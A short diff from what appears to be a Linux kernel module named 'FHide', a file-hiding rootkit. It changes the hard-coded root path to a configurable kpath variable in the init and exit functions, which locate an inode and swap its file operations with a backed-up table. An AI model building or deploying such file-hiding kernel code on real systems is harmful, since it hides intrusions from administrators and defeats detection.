@@ -59,7 +59,7 @@ static int __init fhide_init(void)
     printk(KERN_INFO "FHide: LKM succefully loaded!\n");
     struct path p;
 
-    if(kern_path("/", 0, &p))
+    if(kern_path(kpath, 0, &p))
         return 0;
 
     proc_inode = p.dentry->d_inode;
@@ -76,7 +76,7 @@ static void __exit fhide_exit(void)
 {
     struct path p;
     struct inode *proc_inode;
-    if(kern_path("/", 0, &p))
+    if(kern_path(kpath, 0, &p))
         return;
     proc_inode = p.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
